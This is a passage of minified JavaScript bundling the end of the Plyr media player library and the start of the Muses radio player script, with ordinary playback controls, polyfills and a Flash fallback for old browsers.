                    t.elements.container.appendChild(t.media),
                    m.boolean(e.autoplay) && (t.config.autoplay = e.autoplay),
                    t.isHTML5 &&
                      (t.config.crossorigin &&
                        t.media.setAttribute("crossorigin", ""),
                      t.config.autoplay && t.media.setAttribute("autoplay", ""),
                      m.empty(e.poster) || (t.poster = e.poster),
                      t.config.loop.active && t.media.setAttribute("loop", ""),
                      t.config.muted && t.media.setAttribute("muted", ""),
                      t.config.playsinline &&
                        t.media.setAttribute("playsinline", "")),
                    Ee.addStyleHook.call(t),
                    t.isHTML5 && qe.insertElements.call(t, "source", n),
                    (t.config.title = e.title),
                    je.setup.call(t),
                    t.isHTML5 &&
                      Object.keys(e).includes("tracks") &&
                      qe.insertElements.call(t, "track", e.tracks),
                    (t.isHTML5 || (t.isEmbed && !t.supported.ui)) &&
                      Ee.build.call(t),
                    t.isHTML5 && t.media.load(),
                    t.fullscreen.update();
                },
                !0
              ))
            : this.debug.warn("Invalid source format");
        },
      },
      Re = (function () {
        function t(n, i) {
          var a = this;
          if (
            (e(this, t),
            (this.timers = {}),
            (this.ready = !1),
            (this.loading = !1),
            (this.failed = !1),
            (this.touch = W.touch),
            (this.media = n),
            m.string(this.media) &&
              (this.media = document.querySelectorAll(this.media)),
            ((window.jQuery && this.media instanceof jQuery) ||
              m.nodeList(this.media) ||
              m.array(this.media)) &&
              (this.media = this.media[0]),
            (this.config = J(
              {},
              pe,
              t.defaults,
              i || {},
              (function () {
                try {
                  return JSON.parse(a.media.getAttribute("data-plyr-config"));
                } catch (e) {
                  return {};
                }
              })()
            )),
            (this.elements = {
              container: null,
              captions: null,
              buttons: {},
              display: {},
              progress: {},
              inputs: {},
              settings: { popup: null, menu: null, panels: {}, buttons: {} },
            }),
            (this.captions = {
              active: null,
              currentTrack: -1,
              meta: new WeakMap(),
            }),
            (this.fullscreen = { active: !1 }),
            (this.options = { speed: [], quality: [] }),
            (this.debug = new be(this.config.debug)),
            this.debug.log("Config", this.config),
            this.debug.log("Support", W),
            !m.nullOrUndefined(this.media) && m.element(this.media))
          )
            if (this.media.plyr) this.debug.warn("Target already setup");
            else if (this.config.enabled)
              if (W.check().api) {
                var s = this.media.cloneNode(!0);
                (s.autoplay = !1), (this.elements.original = s);
                var o = this.media.tagName.toLowerCase(),
                  r = null,
                  l = null;
                switch (o) {
                  case "div":
                    if (
                      ((r = this.media.querySelector("iframe")), m.element(r))
                    ) {
                      if (
                        ((l = ue(r.getAttribute("src"))),
                        (this.provider = (function (e) {
                          return /^(https?:\/\/)?(www\.)?(youtube\.com|youtu\.?be)\/.+$/.test(
                            e
                          )
                            ? ge.youtube
                            : /^https?:\/\/player.vimeo.com\/video\/\d{0,9}(?=\b|\/)/.test(
                                e
                              )
                            ? ge.vimeo
                            : null;
                        })(l.toString())),
                        (this.elements.container = this.media),
                        (this.media = r),
                        (this.elements.container.className = ""),
                        l.search.length)
                      ) {
                        var c = ["1", "true"];
                        c.includes(l.searchParams.get("autoplay")) &&
                          (this.config.autoplay = !0),
                          c.includes(l.searchParams.get("loop")) &&
                            (this.config.loop.active = !0),
                          this.isYouTube
                            ? ((this.config.playsinline = c.includes(
                                l.searchParams.get("playsinline")
                              )),
                              (this.config.hl = l.searchParams.get("hl")))
                            : (this.config.playsinline = !0);
                      }
                    } else
                      (this.provider = this.media.getAttribute(
                        this.config.attributes.embed.provider
                      )),
                        this.media.removeAttribute(
                          this.config.attributes.embed.provider
                        );
                    if (
                      m.empty(this.provider) ||
                      !Object.keys(ge).includes(this.provider)
                    )
                      return void this.debug.error(
                        "Setup failed: Invalid provider"
                      );
                    this.type = ye.video;
                    break;
                  case "video":
                  case "audio":
                    (this.type = o),
                      (this.provider = ge.html5),
                      this.media.hasAttribute("crossorigin") &&
                        (this.config.crossorigin = !0),
                      this.media.hasAttribute("autoplay") &&
                        (this.config.autoplay = !0),
                      (this.media.hasAttribute("playsinline") ||
                        this.media.hasAttribute("webkit-playsinline")) &&
                        (this.config.playsinline = !0),
                      this.media.hasAttribute("muted") &&
                        (this.config.muted = !0),
                      this.media.hasAttribute("loop") &&
                        (this.config.loop.active = !0);
                    break;
                  default:
                    return void this.debug.error(
                      "Setup failed: unsupported type"
                    );
                }
                (this.supported = W.check(
                  this.type,
                  this.provider,
                  this.config.playsinline
                )),
                  this.supported.api
                    ? ((this.eventListeners = []),
                      (this.listeners = new Pe(this)),
                      (this.storage = new ne(this)),
                      (this.media.plyr = this),
                      m.element(this.elements.container) ||
                        ((this.elements.container = A("div")),
                        w(this.media, this.elements.container)),
                      Ee.addStyleHook.call(this),
                      je.setup.call(this),
                      this.config.debug &&
                        y.call(
                          this,
                          this.elements.container,
                          this.config.events.join(" "),
                          function (e) {
                            a.debug.log("event: ".concat(e.type));
                          }
                        ),
                      (this.isHTML5 || (this.isEmbed && !this.supported.ui)) &&
                        Ee.build.call(this),
                      this.listeners.container(),
                      this.listeners.global(),
                      (this.fullscreen = new Te(this)),
                      this.config.ads.enabled && (this.ads = new Oe(this)),
                      this.config.autoplay && this.play(),
                      (this.lastSeekTime = 0))
                    : this.debug.error("Setup failed: no support");
              } else this.debug.error("Setup failed: no support");
            else this.debug.error("Setup failed: disabled by config");
          else this.debug.error("Setup failed: no suitable element passed");
        }
        return (
          n(
            t,
            [
              {
                key: "play",
                value: function () {
                  return m.function(this.media.play) ? this.media.play() : null;
                },
              },
              {
                key: "pause",
                value: function () {
                  this.playing &&
                    m.function(this.media.pause) &&
                    this.media.pause();
                },
              },
              {
                key: "togglePlay",
                value: function (e) {
                  (m.boolean(e) ? e : !this.playing)
                    ? this.play()
                    : this.pause();
                },
              },
              {
                key: "stop",
                value: function () {
                  this.isHTML5
                    ? (this.pause(), this.restart())
                    : m.function(this.media.stop) && this.media.stop();
                },
              },
              {
                key: "restart",
                value: function () {
                  this.currentTime = 0;
                },
              },
              {
                key: "rewind",
                value: function (e) {
                  this.currentTime =
                    this.currentTime - (m.number(e) ? e : this.config.seekTime);
                },
              },
              {
                key: "forward",
                value: function (e) {
                  this.currentTime =
                    this.currentTime + (m.number(e) ? e : this.config.seekTime);
                },
              },
              {
                key: "increaseVolume",
                value: function (e) {
                  var t = this.media.muted ? 0 : this.volume;
                  this.volume = t + (m.number(e) ? e : 0);
                },
              },
              {
                key: "decreaseVolume",
                value: function (e) {
                  this.increaseVolume(-e);
                },
              },
              {
                key: "toggleCaptions",
                value: function (e) {
                  he.toggle.call(this, e, !1);
                },
              },
              {
                key: "airplay",
                value: function () {
                  W.airplay && this.media.webkitShowPlaybackTargetPicker();
                },
              },
              {
                key: "toggleControls",
                value: function (e) {
                  if (this.supported.ui && !this.isAudio) {
                    var t = x(
                        this.elements.container,
                        this.config.classNames.hideControls
                      ),
                      n = void 0 === e ? void 0 : !e,
                      i = L(
                        this.elements.container,
                        this.config.classNames.hideControls,
                        n
                      );
                    if (
                      (i &&
                        this.config.controls.includes("settings") &&
                        !m.empty(this.config.settings) &&
                        ce.toggleMenu.call(this, !1),
                      i !== t)
                    ) {
                      var a = i ? "controlshidden" : "controlsshown";
                      k.call(this, this.media, a);
                    }
                    return !i;
                  }
                  return !1;
                },
              },
              {
                key: "on",
                value: function (e, t) {
                  y.call(this, this.elements.container, e, t);
                },
              },
              {
                key: "once",
                value: function (e, t) {
                  b.call(this, this.elements.container, e, t);
                },
              },
              {
                key: "off",
                value: function (e, t) {
                  v(this.elements.container, e, t);
                },
              },
              {
                key: "destroy",
                value: function (e) {
                  var t = this,
                    n =
                      arguments.length > 1 &&
                      void 0 !== arguments[1] &&
                      arguments[1];
                  if (this.ready) {
                    var i = function () {
                      (document.body.style.overflow = ""),
                        (t.embed = null),
                        n
                          ? (Object.keys(t.elements).length &&
                              (P(t.elements.buttons.play),
                              P(t.elements.captions),
                              P(t.elements.controls),
                              P(t.elements.wrapper),
                              (t.elements.buttons.play = null),
                              (t.elements.captions = null),
                              (t.elements.controls = null),
                              (t.elements.wrapper = null)),
                            m.function(e) && e())
                          : (function () {
                              this &&
                                this.eventListeners &&
                                (this.eventListeners.forEach(function (e) {
                                  var t = e.element,
                                    n = e.type,
                                    i = e.callback,
                                    a = e.options;
                                  t.removeEventListener(n, i, a);
                                }),
                                (this.eventListeners = []));
                            }.call(t),
                            S(t.elements.original, t.elements.container),
                            k.call(t, t.elements.original, "destroyed", !0),
                            m.function(e) && e.call(t.elements.original),
                            (t.ready = !1),
                            setTimeout(function () {
                              (t.elements = null), (t.media = null);
                            }, 200));
                    };
                    this.stop(),
                      this.isHTML5
                        ? (clearTimeout(this.timers.loading),
                          Ee.toggleNativeControls.call(this, !0),
                          i())
                        : this.isYouTube
                        ? (clearInterval(this.timers.buffering),
                          clearInterval(this.timers.playing),
                          null !== this.embed &&
                            m.function(this.embed.destroy) &&
                            this.embed.destroy(),
                          i())
                        : this.isVimeo &&
                          (null !== this.embed && this.embed.unload().then(i),
                          setTimeout(i, 200));
                  }
                },
              },
              {
                key: "supports",
                value: function (e) {
                  return W.mime.call(this, e);
                },
              },
              {
                key: "isHTML5",
                get: function () {
                  return Boolean(this.provider === ge.html5);
                },
              },
              {
                key: "isEmbed",
                get: function () {
                  return Boolean(this.isYouTube || this.isVimeo);
                },
              },
              {
                key: "isYouTube",
                get: function () {
                  return Boolean(this.provider === ge.youtube);
                },
              },
              {
                key: "isVimeo",
                get: function () {
                  return Boolean(this.provider === ge.vimeo);
                },
              },
              {
                key: "isVideo",
                get: function () {
                  return Boolean(this.type === ye.video);
                },
              },
              {
                key: "isAudio",
                get: function () {
                  return Boolean(this.type === ye.audio);
                },
              },
              {
                key: "playing",
                get: function () {
                  return Boolean(this.ready && !this.paused && !this.ended);
                },
              },
              {
                key: "paused",
                get: function () {
                  return Boolean(this.media.paused);
                },
              },
              {
                key: "stopped",
                get: function () {
                  return Boolean(this.paused && 0 === this.currentTime);
                },
              },
              {
                key: "ended",
                get: function () {
                  return Boolean(this.media.ended);
                },
              },
              {
                key: "currentTime",
                set: function (e) {
                  if (this.duration) {
                    var t = m.number(e) && e > 0;
                    (this.media.currentTime = t
                      ? Math.min(e, this.duration)
                      : 0),
                      this.debug.log(
                        "Seeking to ".concat(this.currentTime, " seconds")
                      );
                  }
                },
                get: function () {
                  return Number(this.media.currentTime);
                },
              },
              {
                key: "buffered",
                get: function () {
                  var e = this.media.buffered;
                  return m.number(e)
                    ? e
                    : e && e.length && this.duration > 0
                    ? e.end(0) / this.duration
                    : 0;
                },
              },
              {
                key: "seeking",
                get: function () {
                  return Boolean(this.media.seeking);
                },
              },
              {
                key: "duration",
                get: function () {
                  var e = parseFloat(this.config.duration),
                    t = (this.media || {}).duration,
                    n = m.number(t) && t !== 1 / 0 ? t : 0;
                  return e || n;
                },
              },
              {
                key: "volume",
                set: function (e) {
                  var t = e;
                  m.string(t) && (t = Number(t)),
                    m.number(t) || (t = this.storage.get("volume")),
                    m.number(t) || (t = this.config.volume),
                    t > 1 && (t = 1),
                    t < 0 && (t = 0),
                    (this.config.volume = t),
                    (this.media.volume = t),
                    !m.empty(e) && this.muted && t > 0 && (this.muted = !1);
                },
                get: function () {
                  return Number(this.media.volume);
                },
              },
              {
                key: "muted",
                set: function (e) {
                  var t = e;
                  m.boolean(t) || (t = this.storage.get("muted")),
                    m.boolean(t) || (t = this.config.muted),
                    (this.config.muted = t),
                    (this.media.muted = t);
                },
                get: function () {
                  return Boolean(this.media.muted);
                },
              },
              {
                key: "hasAudio",
                get: function () {
                  return (
                    !this.isHTML5 ||
                    !!this.isAudio ||
                    Boolean(this.media.mozHasAudio) ||
                    Boolean(this.media.webkitAudioDecodedByteCount) ||
                    Boolean(
                      this.media.audioTracks && this.media.audioTracks.length
                    )
                  );
                },
              },
              {
                key: "speed",
                set: function (e) {
                  var t = null;
                  m.number(e) && (t = e),
                    m.number(t) || (t = this.storage.get("speed")),
                    m.number(t) || (t = this.config.speed.selected),
                    t < 0.1 && (t = 0.1),
                    t > 2 && (t = 2),
                    this.config.speed.options.includes(t)
                      ? ((this.config.speed.selected = t),
                        (this.media.playbackRate = t))
                      : this.debug.warn("Unsupported speed (".concat(t, ")"));
                },
                get: function () {
                  return Number(this.media.playbackRate);
                },
              },
              {
                key: "quality",
                set: function (e) {
                  var t = this.config.quality,
                    n = this.options.quality;
                  if (n.length) {
                    var i = [
                        !m.empty(e) && Number(e),
                        this.storage.get("quality"),
                        t.selected,
                        t.default,
                      ].find(m.number),
                      a = !0;
                    if (!n.includes(i)) {
                      var s = (function (e, t) {
                        return m.array(e) && e.length
                          ? e.reduce(function (e, n) {
                              return Math.abs(n - t) < Math.abs(e - t) ? n : e;
                            })
                          : null;
                      })(n, i);
                      this.debug.warn(
                        "Unsupported quality option: "
                          .concat(i, ", using ")
                          .concat(s, " instead")
                      ),
                        (i = s),
                        (a = !1);
                    }
                    (t.selected = i),
                      (this.media.quality = i),
                      a && this.storage.set({ quality: i });
                  }
                },
                get: function () {
                  return this.media.quality;
                },
              },
              {
                key: "loop",
                set: function (e) {
                  var t = m.boolean(e) ? e : this.config.loop.active;
                  (this.config.loop.active = t), (this.media.loop = t);
                },
                get: function () {
                  return Boolean(this.media.loop);
                },
              },
              {
                key: "source",
                set: function (e) {
                  qe.change.call(this, e);
                },
                get: function () {
                  return this.media.currentSrc;
                },
              },
              {
                key: "download",
                get: function () {
                  var e = this.config.urls.download;
                  return m.url(e) ? e : this.source;
                },
              },
              {
                key: "poster",
                set: function (e) {
                  this.isVideo
                    ? Ee.setPoster.call(this, e, !1).catch(function () {})
                    : this.debug.warn("Poster can only be set for video");
                },
                get: function () {
                  return this.isVideo
                    ? this.media.getAttribute("poster")
                    : null;
                },
              },
              {
                key: "autoplay",
                set: function (e) {
                  var t = m.boolean(e) ? e : this.config.autoplay;
                  this.config.autoplay = t;
                },
                get: function () {
                  return Boolean(this.config.autoplay);
                },
              },
              {
                key: "currentTrack",
                set: function (e) {
                  he.set.call(this, e, !1);
                },
                get: function () {
                  var e = this.captions,
                    t = e.toggled,
                    n = e.currentTrack;
                  return t ? n : -1;
                },
              },
              {
                key: "language",
                set: function (e) {
                  he.setLanguage.call(this, e, !1);
                },
                get: function () {
                  return (he.getCurrentTrack.call(this) || {}).language;
                },
              },
              {
                key: "pip",
                set: function (e) {
                  if (W.pip) {
                    var t = m.boolean(e) ? e : !this.pip;
                    m.function(this.media.webkitSetPresentationMode) &&
                      this.media.webkitSetPresentationMode(t ? me : fe),
                      m.function(this.media.requestPictureInPicture) &&
                        (!this.pip && t
                          ? this.media.requestPictureInPicture()
                          : this.pip && !t && document.exitPictureInPicture());
                  }
                },
                get: function () {
                  return W.pip
                    ? m.empty(this.media.webkitPresentationMode)
                      ? this.media === document.pictureInPictureElement
                      : this.media.webkitPresentationMode === me
                    : null;
                },
              },
            ],
            [
              {
                key: "supported",
                value: function (e, t, n) {
                  return W.check(e, t, n);
                },
              },
              {
                key: "loadSprite",
                value: function (e, t) {
                  return ae(e, t);
                },
              },
              {
                key: "setup",
                value: function (e) {
                  var n =
                      arguments.length > 1 && void 0 !== arguments[1]
                        ? arguments[1]
                        : {},
                    i = null;
                  return (
                    m.string(e)
                      ? (i = Array.from(document.querySelectorAll(e)))
                      : m.nodeList(e)
                      ? (i = Array.from(e))
                      : m.array(e) && (i = e.filter(m.element)),
                    m.empty(i)
                      ? null
                      : i.map(function (e) {
                          return new t(e, n);
                        })
                  );
                },
              },
            ]
          ),
          t
        );
      })();
    return (Re.defaults = ((Ie = pe), JSON.parse(JSON.stringify(Ie)))), Re;
  });

/* muses */

var $jscomp = $jscomp || {};
$jscomp.scope = {};
$jscomp.ASSUME_ES5 = !1;
$jscomp.ASSUME_NO_NATIVE_MAP = !1;
$jscomp.ASSUME_NO_NATIVE_SET = !1;
$jscomp.defineProperty =
  $jscomp.ASSUME_ES5 || "function" == typeof Object.defineProperties
    ? Object.defineProperty
    : function (d, q, k) {
        d != Array.prototype && d != Object.prototype && (d[q] = k.value);
      };
$jscomp.getGlobal = function (d) {
  return "undefined" != typeof window && window === d
    ? d
    : "undefined" != typeof global && null != global
    ? global
    : d;
};
$jscomp.global = $jscomp.getGlobal(this);
$jscomp.SYMBOL_PREFIX = "jscomp_symbol_";
$jscomp.initSymbol = function () {
  $jscomp.initSymbol = function () {};
  $jscomp.global.Symbol || ($jscomp.global.Symbol = $jscomp.Symbol);
};
$jscomp.Symbol = (function () {
  var d = 0;
  return function (q) {
    return $jscomp.SYMBOL_PREFIX + (q || "") + d++;
  };
})();
$jscomp.initSymbolIterator = function () {
  $jscomp.initSymbol();
  var d = $jscomp.global.Symbol.iterator;
  d || (d = $jscomp.global.Symbol.iterator = $jscomp.global.Symbol("iterator"));
  "function" != typeof Array.prototype[d] &&
    $jscomp.defineProperty(Array.prototype, d, {
      configurable: !0,
      writable: !0,
      value: function () {
        return $jscomp.arrayIterator(this);
      },
    });
  $jscomp.initSymbolIterator = function () {};
};
$jscomp.arrayIterator = function (d) {
  var q = 0;
  return $jscomp.iteratorPrototype(function () {
    return q < d.length ? { done: !1, value: d[q++] } : { done: !0 };
  });
};
$jscomp.iteratorPrototype = function (d) {
  $jscomp.initSymbolIterator();
  d = { next: d };
  d[$jscomp.global.Symbol.iterator] = function () {
    return this;
  };
  return d;
};
$jscomp.iteratorFromArray = function (d, q) {
  $jscomp.initSymbolIterator();
  d instanceof String && (d += "");
  var k = 0,
    w = {
      next: function () {
        if (k < d.length) {
          var u = k++;
          return { value: q(u, d[u]), done: !1 };
        }
        w.next = function () {
          return { done: !0, value: void 0 };
        };
        return w.next();
      },
    };
  w[Symbol.iterator] = function () {
    return w;
  };
  return w;
};
$jscomp.polyfill = function (d, q, k, w) {
  if (q) {
    k = $jscomp.global;
    d = d.split(".");
    for (w = 0; w < d.length - 1; w++) {
      var u = d[w];
      u in k || (k[u] = {});
      k = k[u];
    }
    d = d[d.length - 1];
    w = k[d];
    q = q(w);
    q != w &&
      null != q &&
      $jscomp.defineProperty(k, d, {
        configurable: !0,
        writable: !0,
        value: q,
      });
  }
};
$jscomp.polyfill(
  "Array.prototype.keys",
  function (d) {
    return d
      ? d
      : function () {
          return $jscomp.iteratorFromArray(this, function (d) {
            return d;
          });
        };
  },
  "es6",
  "es3"
);
var mrx24gx = mrx24gx || [];
mrx24gx.push("ftinc");
if (2 == mrx24gx.length) {
  (function (d, q) {
    function k(a, b) {
      function c() {}
      c.prototype = a;
      a = new c();
      for (var g in b) a[g] = b[g];
      b.toString !== Object.prototype.toString && (a.toString = b.toString);
      return a;
    }
    function w(a) {
      return a instanceof Array
        ? function () {
            return r.iter(a);
          }
        : "function" == typeof a.iterator
        ? u(a, a.iterator)
        : a.iterator;
    }
    function u(a, b) {
      if (null == b) return null;
      null == b.__id__ && (b.__id__ = Ka++);
      var c;
      null == a.hx__closures__
        ? (a.hx__closures__ = {})
        : (c = a.hx__closures__[b.__id__]);
      null == c &&
        ((c = function () {
          return c.method.apply(c.scope, arguments);
        }),
        (c.scope = a),
        (c.method = b),
        (a.hx__closures__[b.__id__] = c));
      return c;
    }
    d.muses = d.muses || {};
    var D = function (a, b) {
      this.r = new RegExp(a, b.split("u").join(""));
    };
    D.__name__ = ["EReg"];
    D.prototype = {
      match: function (a) {
        this.r.global && (this.r.lastIndex = 0);
        this.r.m = this.r.exec(a);
        this.r.s = a;
        return null != this.r.m;
      },
      __class__: D,
    };
    var r = function () {};
    r.__name__ = ["HxOverrides"];
    r.strDate = function (a) {
      switch (a.length) {
        case 8:
          a = a.split(":");
          var b = new Date();
          b.setTime(0);
          b.setUTCHours(a[0]);
          b.setUTCMinutes(a[1]);
          b.setUTCSeconds(a[2]);
          return b;
        case 10:
          return (a = a.split("-")), new Date(a[0], a[1] - 1, a[2], 0, 0, 0);
        case 19:
          return (
            (b = a.split(" ")),
            (a = b[0].split("-")),
            (b = b[1].split(":")),
            new Date(a[0], a[1] - 1, a[2], b[0], b[1], b[2])
          );
        default:
          throw new p("Invalid date format : " + a);
      }
    };
    r.cca = function (a, b) {
      a = a.charCodeAt(b);
      if (a == a) return a;
    };
    r.substr = function (a, b, c) {
      if (null == c) c = a.length;
      else if (0 > c)
        if (0 == b) c = a.length + c;
        else return "";
      return a.substr(b, c);
    };
    r.remove = function (a, b) {
      b = a.indexOf(b);
      if (-1 == b) return !1;
      a.splice(b, 1);
      return !0;
    };
    r.iter = function (a) {
      return {
        cur: 0,
        arr: a,
        hasNext: function () {
          return this.cur < this.arr.length;
        },
        next: function () {
          return this.arr[this.cur++];
        },
      };
    };
    var J = function () {};
    J.__name__ = ["Lambda"];
    J.exists = function (a, b) {
      for (a = w(a)(); a.hasNext(); ) {
        var c = a.next();
        if (b(c)) return !0;
      }
      return !1;
    };
    J.filter = function (a, b) {
      var c = new E();
      for (a = w(a)(); a.hasNext(); ) {
        var g = a.next();
        b(g) && c.add(g);
      }
      return c;
    };
    var E = function () {
      this.length = 0;
    };
    E.__name__ = ["List"];
    E.prototype = {
      add: function (a) {
        a = new K(a, null);
        null == this.h ? (this.h = a) : (this.q.next = a);
        this.q = a;
        this.length++;
      },
      push: function (a) {
        this.h = a = new K(a, this.h);
        null == this.q && (this.q = a);
        this.length++;
      },
      iterator: function () {
        return new Z(this.h);
      },
      __class__: E,
    };
    var K = function (a, b) {
      this.item = a;
      this.next = b;
    };
    K.__name__ = ["_List", "ListNode"];
    K.prototype = { __class__: K };
    var Z = function (a) {
      this.head = a;
    };
    Z.__name__ = ["_List", "ListIterator"];
    Z.prototype = {
      hasNext: function () {
        return null != this.head;
      },
      next: function () {
        var a = this.head.item;
        this.head = this.head.next;
        return a;
      },
      __class__: Z,
    };
    var e = (d.MRP = function () {});
    e.__name__ = ["MRP"];
    e.setElementId = function (a) {
      e.elementId = a;
    };
    e.setObjectId = function (a) {
      e.objectId = a;
    };
    e.getStatus = function () {
      var a = e.getJSPlayer();
      return null == a ? null : a.ui.status;
    };
    e.isPlaying = function () {
      var a = e.getJSPlayer();
      return null == a ? !1 : a.isPlaying();
    };
    e.getJSPlayer = function () {
      var a = e.objectId,
        b = e.jsInstances;
      if (null != t[a] ? !b.existsReserved(a) : !b.h.hasOwnProperty(a))
        return null;
      a = e.objectId;
      b = e.jsInstances;
      return null != t[a] ? b.getReserved(a) : b.h[a];
    };
    e.play = function () {
      var a = e.objectId,
        b = e.jsInstances;
      if (null != t[a] ? b.existsReserved(a) : b.h.hasOwnProperty(a))
        (a = e.objectId),
          (b = e.jsInstances),
          (null != t[a] ? b.getReserved(a) : b.h[a]).playAudio();
      a = e.objectId;
      b = e.flashInstances;
      if (null != t[a] ? b.existsReserved(a) : b.h.hasOwnProperty(a))
        (a = e.objectId),
          (b = e.flashInstances),
          (null != t[a] ? b.getReserved(a) : b.h[a]).playSound();
    };
    e.stop = function () {
      var a = e.objectId,
        b = e.jsInstances;
      if (null != t[a] ? b.existsReserved(a) : b.h.hasOwnProperty(a))
        (a = e.objectId),
          (b = e.jsInstances),
          (null != t[a] ? b.getReserved(a) : b.h[a]).stopAudio(!1);
      a = e.objectId;
      b = e.flashInstances;
      if (null != t[a] ? b.existsReserved(a) : b.h.hasOwnProperty(a))
        (a = e.objectId),
          (b = e.flashInstances),
          (null != t[a] ? b.getReserved(a) : b.h[a]).stopSound();
    };
    e.setVolume = function (a) {
      var b = e.objectId,
        c = e.jsInstances;
      if (null != t[b] ? c.existsReserved(b) : c.h.hasOwnProperty(b))
        (b = e.objectId),
          (c = e.jsInstances),
          (null != t[b] ? c.getReserved(b) : c.h[b]).setVolume(a / 100);
      b = e.objectId;
      c = e.flashInstances;
      if (null != t[b] ? c.existsReserved(b) : c.h.hasOwnProperty(b))
        (b = e.objectId),
          (c = e.flashInstances),
          (null != t[b] ? c.getReserved(b) : c.h[b]).setVolume(a / 100);
    };
    e.showInfo = function (a) {
      var b = e.objectId,
        c = e.jsInstances;
      if (null != t[b] ? c.existsReserved(b) : c.h.hasOwnProperty(b))
        (b = e.objectId),
          (c = e.jsInstances),
          (null != t[b] ? c.getReserved(b) : c.h[b]).ui.showInfo(a);
      b = e.objectId;
      c = e.flashInstances;
      if (null != t[b] ? c.existsReserved(b) : c.h.hasOwnProperty(b))
        (b = e.objectId),
          (c = e.flashInstances),
          (null != t[b] ? c.getReserved(b) : c.h[b]).showInfo(a);
    };
    e.setTitle = function (a) {
      var b = e.objectId,
        c = e.jsInstances;
      if (null != t[b] ? c.existsReserved(b) : c.h.hasOwnProperty(b))
        (b = e.objectId),
          (c = e.jsInstances),
          (null != t[b] ? c.getReserved(b) : c.h[b]).ui.setTitle(a);
      b = e.objectId;
      c = e.flashInstances;
      if (null != t[b] ? c.existsReserved(b) : c.h.hasOwnProperty(b))
        (b = e.objectId),
          (c = e.flashInstances),
          (null != t[b] ? c.getReserved(b) : c.h[b]).setTitle(a);
    };
    e.setUrl = function (a) {
      var b = e.objectId,
        c = e.jsInstances;
      if (null != t[b] ? c.existsReserved(b) : c.h.hasOwnProperty(b))
        (b = e.objectId),
          (c = e.jsInstances),
          (null != t[b] ? c.getReserved(b) : c.h[b]).setUrl(a);
      b = e.objectId;
      c = e.flashInstances;
      if (null != t[b] ? c.existsReserved(b) : c.h.hasOwnProperty(b))
        (b = e.objectId),
          (c = e.flashInstances),
          (null != t[b] ? c.getReserved(b) : c.h[b]).setUrl(a);
    };
    e.setFallbackUrl = function (a) {
      var b = e.objectId,
        c = e.jsInstances;
      if (null != t[b] ? c.existsReserved(b) : c.h.hasOwnProperty(b))
        (b = e.objectId),
          (c = e.jsInstances),
          (null != t[b] ? c.getReserved(b) : c.h[b]).setFallbackUrl(a);
      b = e.objectId;
      c = e.flashInstances;
      if (null != t[b] ? c.existsReserved(b) : c.h.hasOwnProperty(b))
        (b = e.objectId),
          (c = e.flashInstances),
          (null != t[b] ? c.getReserved(b) : c.h[b]).setFallbackUrl(a);
    };
    e.setCallbackFunction = function (a) {
      musesCallback = a;
    };
    e.getScriptBaseHREF = function () {
      return "//hosted.muses.org";
    };
    e.getSkin = function (a, b) {
      return -1 != a.indexOf("/") || (b && ("original" == a || "tiny" == a))
        ? a
        : e.getScriptBaseHREF() + "/2.4.5/muses-" + a + ".xml";
    };
    e.createMusesStyleReset = function () {
      if (null == mrpStyleReset) {
        var a = window.document.createElement("style"),
          b = window.document.createTextNode(
            ".musesStyleReset,.musesStyleReset DIV,.musesStyleReset IMG,.musesStyleReset SPAN { animation:none;animation-delay:0;animation-direction:normal;animation-duration:0;animation-fill-mode:none;animation-iteration-count:1;animation-name:none;animation-play-state:running;animation-timing-function:ease;backface-visibility:visible;background:0;background-attachment:scroll;background-clip:border-box;background-color:transparent;background-image:none;background-origin:padding-box;background-position:0 0;background-position-x:0;background-position-y:0;background-repeat:repeat;background-size:auto auto;border:0;border-style:none;border-width:medium;border-color:inherit;border-bottom:0;border-bottom-color:inherit;border-bottom-left-radius:0;border-bottom-right-radius:0;border-bottom-style:none;border-bottom-width:medium;border-collapse:separate;border-image:none;border-left:0;border-left-color:inherit;border-left-style:none;border-left-width:medium;border-radius:0;border-right:0;border-right-color:inherit;border-right-style:none;border-right-width:medium;border-spacing:0;border-top:0;border-top-color:inherit;border-top-left-radius:0;border-top-right-radius:0;border-top-style:none;border-top-width:medium;bottom:auto;box-shadow:none;box-sizing:content-box;caption-side:top;clear:none;clip:auto;color:inherit;columns:auto;column-count:auto;column-fill:balance;column-gap:normal;column-rule:medium none currentColor;column-rule-color:currentColor;column-rule-style:none;column-rule-width:none;column-span:1;column-width:auto;content:normal;counter-increment:none;counter-reset:none;cursor:default;direction:ltr;display:block;empty-cells:show;float:none;font:normal;font-family:inherit;font-size:12px;font-style:normal;font-variant:normal;font-weight:normal;height:auto;hyphens:none;left:auto;letter-spacing:normal;line-height:normal;list-style:none;list-style-image:none;list-style-position:outside;list-style-type:disc;margin:0;margin-bottom:0;margin-left:0;margin-right:0;margin-top:0;max-height:none !important;max-width:none !important;min-height:0;min-width:0;opacity:1;orphans:0;outline:0;outline-color:invert;outline-style:none;outline-width:medium;overflow:visible;overflow-x:visible;overflow-y:visible;padding:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;page-break-after:auto;page-break-before:auto;page-break-inside:auto;perspective:none;perspective-origin:50% 50%;position:static;right:auto;tab-size:8;table-layout:auto;text-align:inherit;text-align-last:auto;text-decoration:none;text-decoration-color:inherit;text-decoration-line:none;text-decoration-style:solid;text-indent:0;text-shadow:none;text-transform:none;top:auto;transform:none;transform-style:flat;transition:none;transition-delay:0s;transition-duration:0s;transition-property:none;transition-timing-function:ease;unicode-bidi:normal;vertical-align:baseline;visibility:visible;white-space:normal;widows:0;width:auto;word-spacing:normal;z-index:auto;-o-user-select:none;-webkit-touch-callout:none;-webkit-user-select:none;-khtml-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;-webkit-tap-highlight-color:rgba(0,0,0,0);-webkit-tap-highlight-color:transparent;}"
          );
        a.appendChild(b);
        window.document.head.appendChild(a);
        mrpStyleReset = a;
      }
    };
    e.browserSupportsCodec = function (a) {
      return "ogg" != a && "aac" != a && "mp3" != a ? !0 : mrpBrowserCompat[a];
    };
    e.isIE = function () {
      return mrpBrowserCompat.isIE;
    };
    e.insert = function (a) {
      1 == a.forceFlash
        ? e.flashInsert(a)
        : 0 < e.isIE() && 11 > e.isIE()
        ? (console.log(
            "MusesRadioPlayer will use Flash Version here since you have Internet Explorer " +
              e.isIE() +
              " (wich is older than IE 11)."
          ),
          e.flashInsert(a))
        : 0 < e.isIE() &&
          11 <= e.isIE() &&
          "aac" == a.codec &&
          FlashDetect.versionAtLeast(10, 1)
        ? (console.log(
            "MusesRadioPlayer will use Flash Version here since you have Internet Explorer " +
              e.isIE() +
              " (wich claims to support AAC but it doesn't support it right)."
          ),
          e.flashInsert(a))
